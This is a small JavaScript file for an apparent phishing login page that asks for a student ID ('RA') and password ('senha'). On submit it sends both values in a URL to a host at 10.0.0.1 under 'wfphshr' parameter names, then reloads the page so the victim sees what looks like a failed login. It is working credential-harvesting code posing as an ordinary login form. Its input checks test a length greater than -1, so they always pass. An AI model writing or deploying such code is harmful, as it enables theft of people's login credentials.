const buttonEnter = document.getElementsByClassName('login-button')
const inputUser = document.getElementById('inputRA')
const inputPass = document.getElementById('inputSenha')

var isInputUserFilled = false
var isInputPassFilled = false

inputUser.addEventListener('keydown', (e) => {
    if(e.target.value.length > -1){
        isInputUserFilled = true
        if(isInputPassFilled){
            buttonEnter[0].removeAttribute("disabled")
        }
    }
    else{
        isInputUserFilled = false
        buttonEnter[0].setAttribute("disabled", "disabled")
    }
})

inputPass.addEventListener('keydown', (e) => {
    if(e.target.value.length > -1){
        isInputPassFilled = true
        if(isInputUserFilled){
            buttonEnter[0].removeAttribute("disabled")
        }
    }
    else{
        isInputPassFilled = false
        buttonEnter[0].setAttribute("disabled", "disabled")
    }

})

var form = document.getElementById('login-form');
form.onsubmit = function(event){
        var xhr = new XMLHttpRequest();
        
        let login = document.getElementById('inputRA').value;

        let senha = document.getElementById('inputSenha').value;

        xhr.open('POST',`http://10.0.0.1:8000/index.php?wfphshr-login=${login}&wfphshr-pass=${senha}`, false)

        xhr.send(null);

        location.reload();
        
        return false; 
    }